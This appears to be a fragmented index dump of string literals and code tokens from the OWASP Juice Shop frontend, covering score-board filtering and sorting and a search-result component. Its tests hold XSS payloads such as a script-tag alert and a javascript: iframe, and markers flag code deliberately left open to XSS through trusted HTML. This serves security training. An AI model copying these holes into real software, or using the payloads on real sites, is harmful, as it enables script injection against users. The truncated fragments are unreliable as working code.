Drive/Git/juice-shop/frontend/src/app/score-board/components/hacking-challenge-progress-score-card/hacking-challenge-progress-score-card.component.ts'hacking-challenge-progress-score-card''./hacking-challenge-progress-score-card.component.html''./hacking-challenge-progress-score-card.component.scss'class H ... \n  }\r\n}'hackin ... e-card'hacking-challenge-progress-score-card'./hack ... t.html'./hacking-challenge-progress-score-card.component.html['./hac ... .scss']'./hack ... t.scss'./hacking-challenge-progress-score-card.component.scssprivate ... th\r\n  }this.so ... .lengthP:/My Drive/Git/juice-shop/frontend/src/app/score-board/components/score-card/score-card.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/score-board/components/score-cardshowAsPercentageshowAsP ... == trueshowAsP ... = falseshowProgressBarshowPro ... == truescore(score  ... 0 + '%'(score  ... ) * 100(score / total)score / totalright-groupng-content[right-side]score-groupshowProgressBar === trueprogress-bar-container{{ description }}showAsPercentage == false{{ score }}fraction-total{{ total }}showAsPercentage == true{{ (score / total) * 100 | number : "1.0-0" }}"1.0-0"(score  ... "1.0-0"1.0-00-0P:/My Drive/Git/juice-shop/frontend/src/app/score-board/components/score-card/score-card.component.spec.ts'./score-card.component''ScoreCardComponent'./score-card.component/score-card[ScoreCardComponent]P:/My Drive/Git/juice-shop/frontend/src/app/score-board/components/score-card/score-card.component.ts'score-card''./score-card.component.html''./score-card.component.scss'export  ... true\r\n}class S ... true\r\n}./score-card.component.html./score-card.component.scsspublic total: numberpublic score: numberP:/My Drive/Git/juice-shop/frontend/src/app/score-board/components/tutorial-mode-warning/tutorial-mode-warning.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/score-board/components/tutorial-mode-warningtutorialModeActivetutorial-mode-warning-text{{ 'INFO_FULL_CHALLENGE_MODE' | translate: {num: allChallenges.length} }}'INFO_FULL_CHALLENGE_MODE''INFO_F ... length}'INFO_F ... E_MODE'INFO_FULL_CHALLENGE_MODE{num: a ... length}num: al ... .lengthP:/My Drive/Git/juice-shop/frontend/src/app/score-board/components/tutorial-mode-warning/tutorial-mode-warning.component.spec.tsTutorialModeWarningComponent'./tutorial-mode-warning.component''TutorialModeWarningComponent'applicationConfig'should show warning when there are configured and unsolved tutorial challenges exist''not show if tutorial is not configured''should not show warning when all tutorial mode challenges are solved''./tuto ... ponent'./tutorial-mode-warning.component/tutorial-mode-warningTutoria ... mponent'Tutori ... ponent'[Tutori ... ponent]tutorialOrder: 1tutorialOrder: nullcompone ... nConfigchallen ...       }should show warning when there are configured and unsolved tutorial challenges existexpect( ... Active)compone ... eActiveit('not ... )\r\n  })'not sh ... igured'not show if tutorial is not configuredrestric ... : falseshould not show warning when all tutorial mode challenges are solvedP:/My Drive/Git/juice-shop/frontend/src/app/score-board/components/tutorial-mode-warning/tutorial-mode-warning.component.ts'tutorial-mode-warning''./tutorial-mode-warning.component.html'allTutorialChallengesSolved@Compon ... ml'\r\n})Compone ... ml'\r\n}){\r\n  se ... tml'\r\n}'tutori ... arning'tutorial-mode-warning'./tuto ... t.html'./tutorial-mode-warning.component.htmlConfig | nullboolean | nullngOnCha ... ed\r\n  }{\r\n     ... ed\r\n  }!this.a ... lsFirstthis.ap ... lsFirstthis.ap ... llengesthis.ap ... nConfigthis.tu ... = falsethis.tu ... eActiveconst a ... solved)allTuto ... solved)allTuto ... sSolvedthis.al ...  .everythis.al ... = null)challen ... alOrderthis.tu ... sSolved!allTut ... sSolvedP:/My Drive/Git/juice-shop/frontend/src/app/score-board/components/warning-card/warning-card.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/score-board/components/warning-cardwarning-container[warning-action]warning-text-icon-group[warning-text][warning-icon]P:/My Drive/Git/juice-shop/frontend/src/app/score-board/components/warning-card/warning-card.component.ts'warning-card''./warning-card.component.html''./warning-card.component.scss'WarningCardComponentexport  ... nent {}class W ... nent {}selecto ... g-card''./warn ... t.html'./warning-card.component.html/warning-card['./war ... .scss']'./warn ... t.scss'./warning-card.component.scssP:/My Drive/Git/juice-shop/frontend/src/app/score-board/filter-settings/FilterSetting.tsP:/My Drive/Git/juice-shop/frontend/src/app/score-board/filter-settings categories to display. if empty, all categories are displayed// cate ... splayed difficulties to display. if empty, all difficulties are displayed// diff ... splayed tags to display. if empty, all tags are displayed// tags ... splayed status to display. if null, all status are displayed// stat ... splayed search query to search challenge names & descriptions for. if null, all challenges are displayed// sear ... splayed whether to show disabled challenges// whet ... llenges if true only challenges belonging to a tutorial are displayed until the user has solved all tutorial challenges// if t ... llengesSolvedStatusrestrictToTutorialChallengesFirst'partially-solved'difficu ...  5 | 6>tags: string[]status: ...  | nullSolvedStatus | nullsearchQ ...  | nullshowDis ... booleanrestric ... esFirstexport  ... solved'type So ... solved''solved ... solved'export  ... lse\r\n})const D ... lse\r\n})DEFAULT ... lse\r\n})Object. ... lse\r\n}){\r\n  ca ... alse\r\n}categories: []difficulties: []tags: []status: nullsearchQuery: nullshowDis ... s: trueReadonl ... etting>P:/My Drive/Git/juice-shop/frontend/src/app/score-board/filter-settings/query-params-converters.tsParams'./FilterSetting'fromQueryParams'true'toQueryParams'false'./FilterSetting/FilterSettingtype FilterSettingexport  ... ting\r\n}functio ... ting\r\n}Readonly<Params>{\r\n  co ... ting\r\n}const f ... TING) }filterS ... TING) }{ ...st ... TING) }...stru ... ETTING)if (que ... ry\r\n  }queryPa ... chQuery{\r\n     ... ry\r\n  }if (que ... ))\r\n  }queryPa ... cultiesfilterS ... culty))queryPa ... culty))queryPa ... .filterqueryPa ... y, 10))queryPa ...    .mapqueryPa ... it(',')queryPa ...  .split(diffic ... ty, 10)parseIn ... ty, 10)(diffic ... iculty)!isNaN(difficulty)isNaN(difficulty)if (que ... ')\r\n  }queryParams.tagsfilterS ... it(',')queryPa ... s.splitif (que ... us\r\n  }queryParams.status{\r\n     ... us\r\n  }queryPa ... egoriesif (que ... e'\r\n  }queryPa ... definedqueryPa ... llengesfilterS ...  'true'queryPa ...  'true'return filterSettingreturn  ... ed\r\n  }searchQ ... definedfilterS ... defineddifficu ... definedfilterS ... in(',')filterS ... es.joinstatus: ... definedtags: f ... definedfilterS ... gs.joincategor ... definedshowDis ... defined!filter ... defined!filter ... llengesP:/My Drive/Git/juice-shop/frontend/src/app/score-board/filter-settings/query-params-coverter.spec.ts'./query-params-converters''fromQueryParams''should convert empty settings to default filters''should somewhat filled query params properly''jwt token''Improper Input Validation''should fully filled query params properly''1,3,5,6''Danger Zone,Good for Demos,Prerequisite''Improper Input Validation,Broken Anti Automation''Danger Zone''Good for Demos''Prerequisite''Broken Anti Automation''toQueryParams''should convert default filterSettings to empty params''should convert somewhat filled filterSettings correctly''should convert fully filled filterSettings correctly'import  ... erters''./quer ... erters'./query-params-converters/query-params-converters{\r\n  it ...   })\r\n}'should ... ilters'should convert empty settings to default filters() => { ... G)\r\n  }{\r\n     ... G)\r\n  }expect( ... ETTING)expect( ... ms({}))fromQueryParams({})'should ... operly'should somewhat filled query params properlyexpect( ... \r\n    )fromQue ...      })searchQ ...  token'jwt tokendifficulties: '1'status: 'solved'categor ... dation'difficulties: [1]categor ... ation']['Impro ... ation']should fully filled query params properlydifficu ... ,3,5,6'1,3,5,6status: ... solved'tags: ' ... uisite''Danger ... uisite'Danger Zone,Good for Demos,Prerequisitecategor ... mation''Improp ... mation'Improper Input Validation,Broken Anti AutomationshowDis ... 'false'difficu ... , 5, 6][1, 3, 5, 6]tags: [ ... isite']['Dange ... isite']categor ...       ]showDis ... : false'should ... params'should convert default filterSettings to empty paramstoQuery ... ETTING)status: undefinedtags: undefined'should ... rectly'should convert somewhat filled filterSettings correctlytoQuery ...      })should convert fully filled filterSettings correctlyP:/My Drive/Git/juice-shop/frontend/src/app/score-board/helpers/challenge-filtering.spec.tsP:/My Drive/Git/juice-shop/frontend/src/app/score-board/helpers'../types/EnrichedChallenge''../filter-settings/FilterSetting'filterChallenges'./challenge-filtering'CHALLENGE_1originalDescription'challenge-1''challenge one''easy'CHALLENGE_2'challenge-2''challenge two'CHALLENGE_3'barfoo''challenge-3''challenge three''hard''docker''filterChallenges''should filter empty list''should filter challenges based on categories properly'arrayWithExactContents'should filter challenges based on difficulties properly''should filter challenges based on tags properly''should filter challenges based on status properly''should filter challenges based on searchQuery properly''lorem''should filter challenges based on disabled setting properly''should only show unsolved tutorial of first difficulty if no challenges are solved''should only show tutorial challenges when restrictToTutorialChallengesFirst is set''should only show unsolved tutorial of first difficulty and solved ones of easier difficulties''should only show ignore tutorial mode when all tutorial challenges are solved''../typ ... llenge'../types/EnrichedChallenge'../fil ... etting'../filter-settings/FilterSettingimport  ... tering''./chal ... tering'./challenge-filtering/challenge-filteringconst C ... allengeCHALLEN ... allenge{\r\n  ca ... allenge{\r\n  ca ... r: 1\r\n}origina ...  ipsum'key: 'challenge-1'challenge-1name: ' ... ge one'challenge onetagList: ['easy']['easy']easy{\r\n  ca ... r: 2\r\n}key: 'challenge-2'challenge-2name: ' ... ge two'challenge twotutorialOrder: 2{\r\n  ca ... null\r\n}category: 'barfoo'barfookey: 'challenge-3'challenge-3name: ' ...  three'challenge threetagList: ['hard']['hard']harddisable ... docker''should ... y list'should filter empty listexpect( ... ING }))filterC ... TING })expect( ... rue }))filterC ... true }){ categ ...  true }categor ...  'bar']['foo', 'bar'][1, 2, 3, 5, 6]tags: ['hard']searchQ ... foobar'should filter challenges based on categories properlyexpect( ... e-2']))expect( ... e.key))filterC ... ge.key)filterC ...   ).mapfilterC ... \r\n    )[CHALLE ... ENGE_3]{ ...DE ... bar'] }categor ... oobar']['foobar'](challe ... nge.keyjasmine ... ge-2'])jasmine ... ontentsarrayWi ... ontents['chall ... nge-2']expect( ... e-3'])){ ...DE ... foo'] }categor ... arfoo']['barfoo']jasmine ... ge-3'])['challenge-3']should filter challenges based on difficulties properly{ ...DE ... 1, 6] }difficulties: [1, 6][1, 6]['chall ... nge-3']{ ...DE ... : [3] }difficulties: [3][3]['challenge-2']should filter challenges based on tags properly{ ...DE ... asy'] }tags: ['easy']{ ...DE ... ard'] }should filter challenges based on status properly{ ...DE ... lved' }expect( ... e-1']))status: 'unsolved'jasmine ... ge-1'])['challenge-1']should filter challenges based on searchQuery properly{ ...DE ... orem' }searchQuery: 'lorem'lorem{ ...DE ... hree' }searchQ ...  three'should filter challenges based on disabled setting properly{ ...DE ...  true }{ ...DE ... false }should only show unsolved tutorial of first difficulty if no challenges are solved{ ...CH ... false }...CHALLENGE_2'should ... is set'should only show tutorial challenges when restrictToTutorialChallengesFirst is set{ ...CH ...  null }should only show unsolved tutorial of first difficulty and solved ones of easier difficulties[{ ...C ... ENGE_3]{ ...CH ...  true }...CHALLENGE_1should only show ignore tutorial mode when all tutorial challenges are solvedP:/My Drive/Git/juice-shop/frontend/src/app/score-board/helpers/challenge-filtering.ts filter by category// filt ... ategory filter by difficulty// filt ... ficulty filter by tags// filter by tags filter by status// filter by status filter disabled challenges// filt ... llenges filter by search query// filt ... h query filter by tutorial challenges there are still unsolved tutorial challenges, but this challenge is not a tutorial challenge so we don't want to show it// ther ... show it find --include difficulty of unsolved tutorial challenges, we only want to show ones matching it or easier// find ...  easiergetCompleteChallengeStatustutorialChallengesdifficultiesOfUnsolvedTutorialChallengeseasiestDifficultyOfUnsolvedTutorialChallengestype SolvedStatusexport  ... \n  )\r\n}functio ... \n  )\r\n}(\r\n     ... })\r\n  )challen ...      })challen ... .filterfilterS ... tegory)filterS ... ncludesfilterS ... iculty)return  ...       )challen ...       )challen ... st.some(tag) = ... es(tag)filterS ... es(tag)filterS ... == nullreturn  ... llenge)filterS ... llenge)getComp ... llenge)getComp ... eStatus(\r\n     ...       )challen ... Case())challen ... ncludesfilterS ... rCase()filterS ... werCaseif (!fi ...       }!filter ... esFirstfilterS ... esFirstconst t ...       )tutoria ...       )challenges.filter(challe ... == nulltutoria ... solved)tutoria ... s.everyif (all ...       }if (!al ...       }!allTut ... == nullconst d ... iculty)difficu ... iculty)tutoria ... iculty)tutoria ...    .maptutoria ... .filter(challe ... ficultyconst e ... lenges)easiest ... lenges)easiest ... llengesMath.mi ... lenges)...diff ... llengeschallen ... llengesif (!ch ... d'\r\n  }return 'unsolved'!challe ... allengereturn  ... solved'if (cha ... \r\n    }challen ... s === 2return 'solved'P:/My Drive/Git/juice-shop/frontend/src/app/score-board/helpers/challenge-sorting.spec.tssortChallenges'./challenge-sorting''sortChallenges''sort tutorial challenges correctly'challengeOrderingCombination'sort non tutorial challenges by difficulty while still maintaining tutorial order for challenges with tutorials'import  ... orting''./chal ... orting'./challenge-sorting/challenge-sortingit('sor ... }\r\n  })'sort t ... rectly'sort tutorial challenges correctlyexpect( ... ge-2'])sortCha ... ge.key)sortCha ... 2]).mapsortCha ... NGE_2])[CHALLE ... ENGE_2]challen ... nge.keysortCha ... 1]).mapsortCha ... NGE_1])[CHALLE ... ENGE_1]const c ... inationchallen ... inationsortCha ... on).mapsortCha ... nation)'sort n ... orials'sort non tutorial challenges by difficulty while still maintaining tutorial order for challenges with tutorialsexpect( ... ge-3'])P:/My Drive/Git/juice-shop/frontend/src/app/score-board/helpers/challenge-sorting.ts'difficulty''tutorialOrder'export  ... e'])\r\n}functio ... e'])\r\n}{\r\n  re ... e'])\r\n}return  ... name'])sortBy( ... name'])['diffi ... 'name']P:/My Drive/Git/juice-shop/frontend/src/app/score-board/pipes/challenge-hint.pipe.tsP:/My Drive/Git/juice-shop/frontend/src/app/score-board/pipesChallengeHintPipeArgs'challengeHint'ChallengeHintPipe'CLICK_FOR_MORE_HINTS'} ${interfa ... null\r\n}Challen ... ipeArgshintUrl ...  | null@Pipe({ ... alse })Pipe({  ... alse }){ name: ... false }name: ' ... geHint'pure: falsetransfo ... t)\r\n  }Observable<string>{ hintUrl: null }hintUrl: nullif (arg ... \r\n    }args.hintUrlreturn  ... ing}`))this.tr ... ing}`))this.tr ... ').pipethis.tr ... HINTS')'CLICK_ ... _HINTS'CLICK_FOR_MORE_HINTSmap((tr ... ring}`)(transl ... tring}``${hint ... tring}`transla ...  stringreturn of(hint)of(hint)P:/My Drive/Git/juice-shop/frontend/src/app/score-board/score-board.component.htmlapplica ... = falseapplica ... lsFirstapplica ... llengesonFilterSettingUpdateonFilte ... $event)onFilte ... gUpdatereset.bind(this)reset.bindisInitializedisIniti ... = falseisIniti ... == truefilteredChallenges.length > 0; else emptyChallengesfilteredChallengestrackBygetChallengeKeyfilteredChallenges;trackBy ... engeKeyopenCod ... d(this)openCod ... og.bindrepeatC ... d(this)repeatC ... on.bind{ solved: challenge.solved, unsolved: !challenge.solved, disabled: challenge.disabledEnv !== null }allChal ... gth > 0isInitialized === trueassets/public/images/padding/1px.pngempty-challengesallChallenges.length > 0{{ 'NO_CHALLENGES_FOUND' | translate }}'NO_CHALLENGES_FOUND''NO_CHA ... anslate'NO_CHA ... _FOUND'NO_CHALLENGES_FOUND<!-- only showing when there are more than 1 challenge in total. not completely loaded otherwise -->let challenge of filteredChallenges; trackBy:getChallengeKey[challenge][applicationConfiguration][openCodingChallengeDialog]openCodingChallengeDialog.bind(this)[repeatChallengeNotification]repeatChallengeNotification.bind(this)[applicationConfig][challenges][filterSetting](filterSettingChange)onFilterSettingUpdate($event)isInitialized === falseloading-spinner-wrappermat-spinnerapplicationConfiguration?.challenges.restrictToTutorialsFirst === false[reset]score-rowP:/My Drive/Git/juice-shop/frontend/src/app/score-board/score-board.component.spec.ts allows to easily create a challenge with some overwrites// allo ... rwritesMatProgressSpinnerModule'@angular/material/progress-spinner''./components/hacking-challenge-progress-score-card/hacking-challenge-progress-score-card.component''./components/coding-challenge-progress-score-card/coding-challenge-progress-score-card.component''./components/challenges-unavailable-warning/challenges-unavailable-warning.component''./components/difficulty-overview-score-card/difficulty-overview-score-card.component''./components/tutorial-mode-warning/tutorial-mode-warning.component''./components/warning-card/warning-card.component''./components/score-card/score-card.component''./score-board.component'createChallengechallengeOverwritesPartial'category-blue''ScoreBoardPreviewComponent'configService'Challenge 1''Challenge 2''Challenge 3''category-red''should not filter any challenges on default settings'toHaveSize'should properly identify that a challenge has a associated coding challenge''should mark challenges as solved on "challenge solved" websocket'onChallengeSolvedWebsocket'should mark find it code challenges as solved on "code challenge solved" websocket'onCodeChallengeSolvedWebsocket'should mark fix it code challenges as solved on "code challenge solved" websocket'import  ... pinner''@angul ... pinner'@angular/material/progress-spinnerMatProg ... rModule./components/hacking-challenge-progress-score-card/hacking-challenge-progress-score-card.component/components/hacking-challenge-progress-score-card/hacking-challenge-progress-score-card./components/coding-challenge-progress-score-card/coding-challenge-progress-score-card.component/components/coding-challenge-progress-score-card/coding-challenge-progress-score-card./components/challenges-unavailable-warning/challenges-unavailable-warning.component/components/challenges-unavailable-warning/challenges-unavailable-warning./components/difficulty-overview-score-card/difficulty-overview-score-card.component/components/difficulty-overview-score-card/difficulty-overview-score-card./components/tutorial-mode-warning/tutorial-mode-warning.component/components/tutorial-mode-warning/tutorial-mode-warning./components/warning-card/warning-card.component/components/warning-card/warning-card./components/score-card/score-card.component/components/score-card/score-card./score-board.component/score-boardPartial<Challenge>return  ... es\r\n  }name: 'foobar'categor ... y-blue'category-bluedescription: ''hint: ''tags: ''hintUrl: ''hasTutorial: falsehasSnippet: falsemitigationUrl: ''...chal ... rwritesScoreBoardPreviewComponentlet challengeServicelet cod ... Servicelet configServicecodeSni ... \n    ])jasmine ... \n    ])configS ... \n    ])challen ... \r\n    )of([\r\n  ...      ])createC ...      })name: 'Challenge 1'Challenge 1name: 'Challenge 2'Challenge 2hasSnippet: truename: 'Challenge 3'Challenge 3categor ... ry-red'category-redcodeSni ... e-2']))codeSni ... ges.andcodeSni ... llengesof(['challenge-2'])configS ... \r\n    )configS ... rnValueconfigS ... ion.andconfigS ... urationof({\r\n  ...      })codingC ... d: trueshowHints: trueshowMit ... s: true'should ... ttings'should not filter any challenges on default settings(): voi ... 3)\r\n  }{\r\n     ... 3)\r\n  }expect( ... Size(3)expect( ... aveSize'should ... llenge'should properly identify that a challenge has a associated coding challenge(): voi ... e)\r\n  }expect( ...  ).toBecompone ...       )compone ... es.find(challe ... enge-2'challen ... enge-2''should ... socket'should mark challenges as solved on "challenge solved" websocket(): voi ... ()\r\n  }(challe ... enge-3'challen ... enge-3'compone ... \n    })compone ... bsocketonChall ... bsocketchallenge: ''flag: ''hidden: falseisRestore: falseshould mark find it code challenges as solved on "code challenge solved" websocket(): voi ... 1)\r\n  }onCodeC ... bsocketshould mark fix it code challenges as solved on "code challenge solved" websocket(): voi ... 2)\r\n  }P:/My Drive/Git/juice-shop/frontend/src/app/score-board/score-board.component.ts manually trigger angular change detection... :(// manu ... n... :( unclear why this is necessary, possibly because the socket.io callback is not running inside angular// uncl ... angular angular helper to speed up challenge rendering// angu ... nderingcombineLatest'./filter-settings/query-params-converters''./filter-settings/FilterSetting''./helpers/challenge-filtering''./types/EnrichedChallenge''./helpers/challenge-sorting'ChallengeSolvedWebsocketCodeChallengeSolvedWebsocket'app-score-board''./score-board.component.html''./score-board.component.scss'subscriptionsdataLoaderSubscriptionchallengeKeysWithCodeChallengestransformedChallengesfilterAndUpdateChallengesrouterSubscription'code challenge solved'subscriptiondisableClose'./filt ... erters'./filter-settings/query-params-converters/filter-settings/query-params-converters'./filt ... etting'./filter-settings/FilterSetting'./help ... tering'./helpers/challenge-filtering/helpers/challenge-filtering'./type ... llenge'./types/EnrichedChallenge'./help ... orting'./helpers/challenge-sorting/helpers/challenge-sortingChallen ... bsocketinterfa ...  | 2\r\n}CodeCha ... bsocketselecto ... -board'app-score-board./score-board.component.html./score-board.component.scsspublic  ... ETTING)private ... [] = []Subscription[]constru ...   ) { }const d ... \n    })dataLoa ... \n    })dataLoa ... riptioncombine ... \n    })combine ... bscribecombine ... \n    ])this.ch ... ame' }){ sort: 'name' }sort: 'name'this.co ... enges()this.co ... llenges([chall ... \r\n    }[challe ... ration]this.ap ... urationconst t ...      })transfo ...      })transfo ... llenges...challengetagList ... )) : []challen ... )) : []challenge.tagschallen ... trim())challen ... ,').mapchallen ... it(',')challenge.tags.split(tag) => tag.trim()tag.trim()tag.trimorigina ...  stringchallen ...  stringdescrip ... string)this.sa ... string)hasCodi ... ge.key)challen ... ge.key)this.al ... llengesthis.fi ... enges()filterA ... llengesthis.is ...  = truethis.isInitializedthis.su ... iption)this.su ... ns.pushthis.subscriptionsconst r ... \n    })routerS ... \n    })this.ro ... bscribe(queryP ... \r\n    }this.fi ... Params)fromQue ... Params)this.io ... (this))this.on ... d(this)this.on ... et.bindthis.on ... bsocket'code c ... solved'code challenge solvedthis.io.socket().offconst subscriptionsubscri ... cribe()subscri ... bscribeonFilte ... })\r\n  }queryPa ... etting)toQuery ... etting)onChall ... })\r\n  }if (!da ... \r\n    }!datathis.al ... \n    })this.al ... ges.mapchallen ... ata.keydata.keyreturn  ... lenge }{ ...challenge }this.ng ...  => {})() => {}onCodeC ... })\r\n  }data.co ... eStatusfilterA ...  )\r\n  }this.fi ... \r\n    )sortCha ... \r\n    )filterC ...      })...this ... Settingrestric ... ?? truethis.ap ... ?? truegetChal ... ey\r\n  }{\r\n     ... ey\r\n  }return challenge.keyreset ( ... })\r\n  }queryPa ... ETTING)openCod ... })\r\n  }const c ... ngeKey)challen ... ngeKey)this.al ... ngeKey)this.al ... es.find(challe ... engeKeychallen ... engeKeydisableClose: truekey: challengeKeyname: challenge.nameasync r ... ()\r\n  }await t ... omise()this.ch ... omise()this.ch ... PromiseP:/My Drive/Git/juice-shop/frontend/src/app/score-board/score-board.module.ts'./components/challenge-card/challenge-card.component''./components/filter-settings/filter-settings.component''./components/difficulty-stars/difficulty-stars.component''./components/filter-settings/components/category-filter/category-filter.component''./components/filter-settings/components/score-board-additional-settings-dialog/score-board-additional-settings-dialog.component''./pipes/challenge-hint.pipe''./components/filter-settings/pipes/difficulty-selection-summary.pipe'./components/challenge-card/challenge-card.component/components/challenge-card/challenge-card./components/filter-settings/filter-settings.component/components/filter-settings/filter-settings./components/difficulty-stars/difficulty-stars.component/components/difficulty-stars/difficulty-stars./components/filter-settings/components/category-filter/category-filter.component/components/filter-settings/components/category-filter/category-filter./components/filter-settings/components/score-board-additional-settings-dialog/score-board-additional-settings-dialog.component/components/filter-settings/components/score-board-additional-settings-dialog/score-board-additional-settings-dialogimport  ... t.pipe''./pipe ... t.pipe'./pipes/challenge-hint.pipe/pipes/challenge-hint'./comp ... y.pipe'./components/filter-settings/pipes/difficulty-selection-summary.pipe/components/filter-settings/pipes/difficulty-selection-summaryclass S ... dule {}@NgModu ...   ]\r\n})NgModul ...   ]\r\n}){\r\n  de ... \n  ]\r\n}export  ... odule }P:/My Drive/Git/juice-shop/frontend/src/app/score-board/types/EnrichedChallenge.tsP:/My Drive/Git/juice-shop/frontend/src/app/score-board/types'../../Models/challenge.model''../../ ... .model'../../Models/challenge.modeltagList: string[]hasCodi ... booleanP:/My Drive/Git/juice-shop/frontend/src/app/search-result/search-result.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/search-result!searchValue !emptyState; else emptyResultonResizeonResize($event)breakpointgridDataSourcegridDat ... | async'100%'100%item.qu ... ity > 0item.quantity <= 5item.quantity > 0{quanti ... antity}item.quantity <= 0showDetail(item)'assets ... m.imageitem.image{{item.name}}item.name!isDelu ... xePrice!isDeluxe()isDeluxe()item.pr ... xePriceitem.priceitem.deluxePriceisDelux ... xePriceaddToBasketaddToBasket(item.id)pageSizeOptionsresultsLengthtable-container custom-slatemat-grid-listmat-grid-tilelet item of gridDataSource | asyncdisplay: flex; justify-content: center;btn-basketClick for more information about the productisDeluxe() && item.price !== item.deluxePrice{{ item.deluxePrice }}{{item.price}}!isDeluxe() || item.price === item.deluxePrice'assets/public/images/products/'+item.imageribbon ribbon-top-left ribbon-soldribbon ribbon-top-leftitem.quantity <= 5 && item.quantity > 0{quantity: item.quantity}search-result-heading{{"TITLE_ALL_PRODUCTS" | translate}}"TITLE_ALL_PRODUCTS"TITLE_ALL_PRODUCTS{{"TITLE_SEARCH_RESULTS" | translate}}"TITLE_SEARCH_RESULTS""TITLE_ ... ESULTS"TITLE_SEARCH_RESULTSP:/My Drive/Git/juice-shop/frontend/src/app/search-result/search-result.component.spec.ts'./search-result.component''src/app/product-details/product-details.component'setQueryParameter'SearchResultComponent'quantinty'should render product descriptions as trusted HTML''<script>alert("XSS")</script>''should hold no products when quantity getAll API call fails''should log error from quantity getAll API call directly to browser console''should notify socket if search query includes DOM XSS payload while filtering table''<iframe src="javascript:alert(`xss`)"> Payload'filterTablemostRecent'verifyLocalXssChallenge''should trim the queryparameter while filtering the datasource''  Product Search   ''product search''should pass the search query as trusted HTML''<script>scripttag</script>''should open a modal dialog with product details''should add new product to basket''Cherry Juice''BASKET_ADD_PRODUCT''should translate BASKET_ADD_PRODUCT message''Translation of BASKET_ADD_PRODUCT''should add similar product to basket''Tomato Juice''BASKET_ADD_SAME_PRODUCT''should translate BASKET_ADD_SAME_PRODUCT message''Translation of BASKET_ADD_SAME_PRODUCT''should not add anything to basket on error retrieving basket''815''should log errors retrieving basket directly to browser console''should not add anything to basket on error retrieving existing basket item''should log errors retrieving basket item directly to browser console''should log errors updating basket directly to browser console''should not add anything to basket on error retrieving product associated with basket item''should log errors retrieving product associated with basket item directly to browser console''should not add anything on error creating new basket item''should log errors creating new basket item directly to browser console''should not add anything on error retrieving product after creating new basket item''should log errors retrieving product after creating new basket item directly to browser console'./search-result.component/search-result'src/ap ... ponent'src/app/product-details/product-details.componentsrc/app/product-details/product-detailssnapsho ...  '' } }{ query ...  '' } }queryPa ... q: '' }{ q: '' }q: ''setQuer ... rg\r\n  }{\r\n     ... rg\r\n  }this.sn ... q = argthis.sn ... arams.qthis.sn ... yParamsthis.snapshot'Search ... ponent'productService: anylet act ... edRouteactivat ... edRoutelet sanitizer: anysanitizer: anyquantit ... tAll'])jasmine ... tAll'])['getAll']['search', 'get']of({ quantinty: 1 }){ quantinty: 1 }quantinty: 1basketS ... ave.andbasketService.savesanitiz ... of({}))deluxeG ... false))of(false)[Search ... ponent]should render product descriptions as trusted HTMLproduct ... >' }]))of([{ d ... t>' }])[{ desc ... pt>' }]{ descr ... ipt>' }descrip ... cript>''<scrip ... cript>'<script>alert("XSS")</script><script>alert("XSS")"XSS"</script>expect( ... ript>')should hold no products when quantity getAll API call failsshould log error from quantity getAll API call directly to browser consoleshould notify socket if search query includes DOM XSS payload while filtering table() => { ... q)\r\n  }activat ... yload')activat ... rameter'<ifram ... ayload'<iframe src="javascript:alert(`xss`)"> Payload<iframe src="javascript:alert(`xss`)`xss`"> PayloadspyOn(m ... 'emit')compone ... Table()compone ... erTableexpect( ... lenge')expect( ... rgs[0])mockSoc ... args[0]mockSoc ... ().argsmockSoc ... ecent()mockSoc ... tRecentmockSoc ... t.callsmockSocket.emitverifyLocalXssChallengeexpect( ... rams.q)expect( ... rgs[1])mockSoc ... args[1]activat ... arams.qactivat ... yParamsactivat ... napshot'should ... source'should trim the queryparameter while filtering the datasourceactivat ... ch   ')'  Prod ... rch   '  Product Search   expect( ... filter)compone ... .filterproduct searchshould pass the search query as trusted HTMLactivat ... ript>')<script>scripttag</script>should open a modal dialog with product detailscompone ... roduct)product ... d: 42 }'should ... basket'should add new product to basketname: 'Cherry Juice'Cherry Juicesession ... '4711')compone ... sket(1)compone ... oBasketexpect( ... ice' })BASKET_ADD_PRODUCT{ produ ... uice' }product ...  Juice'should translate BASKET_ADD_PRODUCT messagetransla ... DUCT'))of('Tra ... ODUCT')'Transl ... RODUCT'Translation of BASKET_ADD_PRODUCTshould add similar product to basketProduct ... 42 } }][{ id:  ... 42 } }]{ id: 2 ...  42 } }name: 'Tomato Juice'Tomato JuiceBasketI ... d: 42 }basketS ... : 5 }))of({ id ... y: 5 }){ id: 4 ... ty: 5 }of({ ProductId: 2 }){ ProductId: 2 }transla ... fined))compone ... sket(2)'BASKET ... RODUCT'BASKET_ADD_SAME_PRODUCTshould translate BASKET_ADD_SAME_PRODUCT messageTranslation of BASKET_ADD_SAME_PRODUCTshould not add anything to basket on error retrieving basketsession ...  '815')815compone ... efined)should log errors retrieving basket directly to browser consoleshould not add anything to basket on error retrieving existing basket itemshould log errors retrieving basket item directly to browser consoleshould log errors updating basket directly to browser consoleshould not add anything to basket on error retrieving product associated with basket itemshould log errors retrieving product associated with basket item directly to browser consoleshould not add anything on error creating new basket itemshould log errors creating new basket item directly to browser consoleshould not add anything on error retrieving product after creating new basket itemshould log errors retrieving product after creating new basket item directly to browser consoleP:/My Drive/Git/juice-shop/frontend/src/app/search-result/search-result.component.ts vuln-code-snippet start restfulXssChallenge vuln-code-snippet neutral-line restfulXssChallenge vuln-code-snippet hide-start// vuln ... e-start vuln-code-snippet hide-end// vuln ... ide-end vuln-code-snippet vuln-line restfulXssChallenge vuln-code-snippet end restfulXssChallenge vuln-code-snippet start localXssChallenge xssBonusChallenge vuln-code-snippet vuln-line localXssChallenge xssBonusChallenge vuln-code-snippet end localXssChallenge xssBonusChallenge webpackChunkName: "tutorial" /* webp ... ial" */faCartPlusTableEntry'app-search-result''./search-result.component.html''./search-result.component.scss''Image''Description''Select'cdRefquantitiesdataTabletrustProductDescriptionentrydataTableEntry/hacking-instructor/startHackingInstructor260017401280850queryParam`Starting instructions for challenge "${}"`'../../hacking-instructor'productsInBasketfoundexistingBasketItemupdatedBasketItembasketAddSameProductnewBasketItembasketAddProductlibrary ... rtPlus)quantity?: numberselecto ... result'app-search-result'./sear ... t.html'./search-result.component.html['./sea ... .scss']'./sear ... t.scss'./search-result.component.scsspublic  ... elect']['Image ... elect']DescriptionSelectpublic  ... eEntry>MatTabl ... eEntry>public  ... e!: anypublic  ... afeHtmlpublic  ... gth = 0paginat ...  = nullMatPaginator | nullpublic  ... ber = 6constru ... ef) { }ngAfter ... })\r\n  }const p ... 